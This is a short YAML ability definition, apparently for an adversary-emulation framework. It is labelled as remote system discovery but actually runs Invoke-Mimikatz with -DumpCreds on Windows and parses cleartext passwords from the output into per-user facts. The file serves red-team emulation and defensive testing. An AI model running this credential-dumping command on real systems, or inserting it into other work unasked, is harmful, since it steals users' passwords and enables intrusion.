---
- id: 9179709f-23f6-482f-9a1e-025cea20bd6e
  name: Powerkatz (XOR'd Payload)
  description: Use Invoke-Mimikatz
  tactic: discovery
  technique:
    attack_id: T1018
    name: Remote System Discovery
  platforms:
    windows:
      psh:
        payload: invoke-mimi.ps1
        command: |
          Import-Module .\invoke-mimi.ps1;
          Invoke-Mimikatz -DumpCreds
        parser:
          name: mimikatz
          property: host.user.password
          script: 'Password\s:\s(.*)'
  consequence:
    - '#{host.user.name},has_password,#{host.user.password}'
